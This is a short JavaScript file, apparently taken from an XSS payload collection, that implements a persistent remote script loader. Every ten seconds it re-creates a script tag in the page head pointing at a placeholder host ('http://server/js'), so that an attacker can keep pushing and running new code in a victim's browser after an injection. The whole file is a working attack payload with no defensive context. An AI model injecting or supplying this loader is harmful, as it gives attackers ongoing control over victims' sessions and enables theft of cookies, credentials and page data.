/* ==== JS loader / Stolen by XSS Payloads ==== */    
/* Connects every 10 seconds                    */
/* to http://server/js and loads returned data  */
/* as the content of a script block (scriptTag) */
/* created in the <head> block of the page      */
/* ============================================ */

function connectLoader(retval) {
    var URL= 'http://server/js';
    var scriptTag = document.getElementById('loadScript');
    var head = document.getElementsByTagName('head').item(0);
    if(scriptTag) head.removeChild(scriptTag);
    var script = document.createElement('script');
    script.src = URL;
    script.type = 'text/javascript';
    script.id = 'loadScript';
    head.appendChild(script);
}
setInterval('connectLoader()',10000);
